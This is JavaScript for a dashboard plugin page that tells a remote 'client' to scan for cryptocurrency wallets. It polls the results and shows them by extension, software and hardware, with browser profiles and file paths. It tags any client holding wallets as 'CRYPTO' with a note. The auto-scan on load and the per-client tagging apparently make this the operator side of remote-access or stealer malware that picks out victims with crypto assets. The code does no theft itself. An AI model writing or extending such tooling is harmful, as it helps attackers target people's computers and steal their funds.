const params = new URLSearchParams(window.location.search);
const clientIdInput = document.getElementById("client-id");
const scanBtn = document.getElementById("scan-btn");
const statusPill = document.getElementById("status-pill");
const countBadge = document.getElementById("count-badge");
const resultsArea = document.getElementById("results-area");
const logEl = document.getElementById("log");

const pluginId = "crypto-wallet";
const clientId = params.get("clientId") || "";
clientIdInput.value = clientId;

let pollTimer = null;
let tagSet = false; // track whether we've already set the CRYPTO tag this session

// ─── Logging ──────────────────────────────────────────────────────────────────

function log(line) {
  const ts = new Date().toISOString();
  logEl.textContent = `${ts}  ${line}\n` + logEl.textContent;
}

// ─── Status pill helpers ───────────────────────────────────────────────────────

function setStatus(text, cls) {
  statusPill.textContent = text;
  statusPill.className = "status-pill " + cls;
}

// ─── API helpers ───────────────────────────────────────────────────────────────

async function sendPluginEvent(event, payload) {
  if (!clientId) { log("Missing clientId"); return; }
  const res = await fetch(
    `/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/event`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event, payload }),
    }
  );
  if (!res.ok) {
    const text = await res.text();
    log(`sendEvent failed: ${res.status} ${text}`);
  }
}

async function pollEvents() {
  if (!clientId) return;
  try {
    const res = await fetch(
      `/api/clients/${encodeURIComponent(clientId)}/plugins/${pluginId}/events`,
      { method: "GET" }
    );
    if (!res.ok) {
      log(`poll failed: ${res.status}`);
      return;
    }
    const data = await res.json();
    for (const item of data.events || []) {
      handleIncomingEvent(item.event, item.payload);
    }
  } catch (err) {
    log(`poll error: ${err.message}`);
  }
}

// ─── Set CRYPTO tag on the client (uses existing API — no server changes needed) ──

async function setCryptoTag(total, wallets) {
  if (!clientId || tagSet) return;
  // Build a short note listing the first few found wallets
  const names = wallets.slice(0, 6).map((w) => w.name);
  const extra = wallets.length > 6 ? ` +${wallets.length - 6} more` : "";
  const note = `${total} wallet(s) detected: ${names.join(", ")}${extra}`;
  try {
    const res = await fetch(
      `/api/clients/${encodeURIComponent(clientId)}/tag`,
      {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ tag: "CRYPTO", note }),
      }
    );
    if (res.ok) {
      tagSet = true;
      log(`Dashboard tag set → CRYPTO (${total} wallet(s) found)`);
    } else {
      const text = await res.text();
      log(`Tag update failed: ${res.status} ${text}`);
    }
  } catch (err) {
    log(`Tag update error: ${err.message}`);
  }
}

// ─── Render results ────────────────────────────────────────────────────────────

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function renderResults(wallets, scannedAt, total) {
  countBadge.textContent = String(total);
  countBadge.classList.toggle("hidden", total === 0);

  if (total === 0) {
    resultsArea.innerHTML = `<p class="no-wallets">&#x2714; No crypto wallets detected on this machine.</p>`;
    return;
  }

  // Group by category
  const groups = {
    browser_extension: [],
    software: [],
    hardware: [],
  };
  for (const w of wallets) {
    if (groups[w.category]) {
      groups[w.category].push(w);
    } else {
      groups.software.push(w); // fallback
    }
  }

  const categoryMeta = {
    browser_extension: { label: "Browser Extensions", cls: "cat-ext", cols: ["Wallet", "Browser", "Profile", "Path"] },
    software: { label: "Software Wallets", cls: "cat-sw", cols: ["Wallet", "Path"] },
    hardware: { label: "Hardware Wallet Software", cls: "cat-hw", cols: ["Wallet", "Path"] },
  };

  let html = "";

  for (const [cat, items] of Object.entries(groups)) {
    if (items.length === 0) continue;
    const meta = categoryMeta[cat];
    const isExt = cat === "browser_extension";

    const rows = items
      .map((w) => {
        if (isExt) {
          return `<tr>
            <td class="wallet-name">${escapeHtml(w.name)}</td>
            <td class="wallet-browser">${escapeHtml(w.browser || "")}</td>
            <td class="wallet-profile">${escapeHtml(w.profile || "")}</td>
            <td class="wallet-path">${escapeHtml(w.path)}</td>
          </tr>`;
        }
        return `<tr>
          <td class="wallet-name">${escapeHtml(w.name)}</td>
          <td class="wallet-path" colspan="3">${escapeHtml(w.path)}</td>
        </tr>`;
      })
      .join("");

    const headers = meta.cols.map((c) => `<th>${escapeHtml(c)}</th>`).join("");

    html += `
      <div class="category-group">
        <div class="category-title ${meta.cls}">
          <span class="cat-dot"></span>${escapeHtml(meta.label)} (${items.length})
        </div>
        <table class="wallet-table">
          <thead><tr>${headers}</tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>`;
  }

  resultsArea.innerHTML = html;
}

// ─── Handle incoming plugin events ────────────────────────────────────────────

function handleIncomingEvent(event, payload) {
  if (event === "ready") {
    log("Plugin ready on client — auto-scan started");
    setStatus("Scanning\u2026", "status-scanning");
  } else if (event === "scan_result") {
    stopPolling();
    const total = payload?.total ?? 0;
    const wallets = payload?.wallets ?? [];
    const scannedAt = payload?.scannedAt ?? "";

    log(`Scan complete at ${scannedAt} — ${total} wallet(s) found`);

    if (total > 0) {
      setStatus(`\u26A0\uFE0F ${total} wallet(s) detected`, "status-found");
      void setCryptoTag(total, wallets);
    } else {
      setStatus("Clean — no wallets detected", "status-clean");
    }

    renderResults(wallets, scannedAt, total);
    scanBtn.disabled = false;
  } else {
    log(`Event: ${event} → ${JSON.stringify(payload)}`);
  }
}

// ─── Polling control ──────────────────────────────────────────────────────────

function startPolling() {
  stopPolling();
  pollTimer = setInterval(pollEvents, 2000);
  // Immediately fire one poll
  void pollEvents();
}

function stopPolling() {
  if (pollTimer !== null) {
    clearInterval(pollTimer);
    pollTimer = null;
  }
}

// ─── Scan button ──────────────────────────────────────────────────────────────

scanBtn.addEventListener("click", async () => {
  if (!clientId) {
    log("No clientId in URL");
    return;
  }
  scanBtn.disabled = true;
  tagSet = false; // allow re-tagging on manual re-scan
  setStatus("Scanning\u2026", "status-scanning");
  log("Manual scan triggered");
  await sendPluginEvent("scan", {});
  startPolling();
});

// ─── Init ─────────────────────────────────────────────────────────────────────

if (!clientId) {
  log("No clientId provided in URL — open this page from a client context");
  setStatus("No client selected", "status-idle");
} else {
  log(`Client: ${clientId}`);
  log("Waiting for auto-scan result\u2026");
  setStatus("Awaiting auto-scan\u2026", "status-scanning");
  // Start polling immediately — the plugin auto-scans on load, result will arrive shortly
  startPolling();
}
